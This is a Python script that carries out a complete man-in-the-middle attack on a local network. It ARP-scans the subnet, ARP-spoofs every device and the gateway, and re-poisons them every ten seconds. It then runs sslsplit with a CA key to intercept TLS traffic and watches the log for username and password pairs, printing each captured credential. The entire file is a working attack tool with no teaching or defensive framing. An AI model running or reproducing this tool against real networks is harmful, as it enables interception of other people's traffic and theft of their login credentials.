#!/usr/bin/env python3

import shlex
import time
from contextlib import contextmanager
from io import SEEK_END
from multiprocessing import Process, Queue
from pathlib import Path
from subprocess import DEVNULL, Popen
from typing import Dict, Tuple
import re

import netifaces
import scapy.all as scapy
from scapy.layers.l2 import ARP, Ether

CREDENTIALS_PATTERN = re.compile(r"username=([^&]+)&password=([^&]+)")

def get_default_gateway() -> Tuple[str, str]:
    """Returns the default gateway as a tuple of (ip, interface)"""

    return netifaces.gateways()["default"][netifaces.AF_INET]


def get_ip_address(interface: str) -> str:
    """Returns the IP address of the given interface"""

    return scapy.get_if_addr(interface)


def get_cidr(interface: str):
    """Returns the CIDR of the given interface"""

    mask = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]["netmask"]
    return sum(bin(int(x)).count("1") for x in mask.split("."))


def arp_request(ip: str):
    """Sends an ARP request to the given IP and returns the response"""

    arp = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    req = ether / arp
    res = scapy.srp(req, timeout=3, verbose=False)[0]
    return res


def arp_scan() -> Tuple[Dict[str, str], str, str]:
    """Scans the network for available devices.

    Returns:
        clients: `dict[str, str]` - A dictionary of IP addresses and MAC addresses
        gateway_ip: `str` - The IP address of the default gateway
        gateway_mac: `str` - The MAC address of the default gateway
    """

    gateway_ip, interface = get_default_gateway()
    ip_address = get_ip_address(interface)
    cidr = get_cidr(interface)

    result = arp_request(f"{ip_address}/{cidr}")
    clients: Dict[str, str] = {}
    gateway_mac = ""
    for _, received in result:
        if received.psrc != gateway_ip:
            clients[received.psrc] = received.hwsrc
        else:
            gateway_mac = received.hwsrc

    if gateway_mac == "":
        raise Exception("Gateway MAC address not found")

    return clients, gateway_ip, gateway_mac


def print_clients(clients: dict):
    """Prints the available devices in a table"""

    print("Available devices")
    print("-" * 33)
    print(f"{'IP':15s} MAC")
    print("-" * 33)
    for ip, mac in clients.items():
        print(f"{ip:15s} {mac}")


def arp_spoof(target_ip: str, target_mac: str, spoof_ip: str):
    """Spoofs the target IP by sending it ARP replies"""

    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def spoof_all(clients: dict, gateway_ip: str, gateway_mac: str):
    """Spoofs all available devices"""

    for client_ip, client_mac in clients.items():
        arp_spoof(client_ip, client_mac, gateway_ip)
        arp_spoof(gateway_ip, gateway_mac, client_ip)


def parse_secret(log_file: Path):
    log_file.touch()

    with log_file.open(errors="ignore") as f:
        f.seek(0, SEEK_END)
        while True:
            line = f.readline().strip()
            if line == "":
                time.sleep(0.5)
                continue
            
            match = CREDENTIALS_PATTERN.search(line)
            if match:
                print(f"Username: {match.group(1)}")
                print(f"Password: {match.group(2)}")


@contextmanager
def sslsplit(log_file: Path):
    """Starts sslsplit"""

    cmd = f"sslsplit -D -L {log_file} -k ca.key -c ca.crt ssl 0.0.0.0 8443"

    with Popen(shlex.split(cmd), stdout=DEVNULL, stderr=DEVNULL) as proc:
        try:
            yield proc
        finally:
            pass


@contextmanager
def secret_reader(log_file: Path):
    """Starts a new process that reads the log file for secrets"""

    proc = Process(target=parse_secret, args=(log_file,))
    proc.start()
    try:
        yield proc
    finally:
        proc.terminate()


def main():
    clients, gateway_ip, gateway_mac = arp_scan()
    print_clients(clients)
    spoof_all(clients, gateway_ip, gateway_mac)

    log_file = Path("mitm.log")
    with sslsplit(log_file), secret_reader(log_file):
        while True:
            try:
                time.sleep(10)
                spoof_all(clients, gateway_ip, gateway_mac)
            except KeyboardInterrupt:
                break


if __name__ == "__main__":
    main()
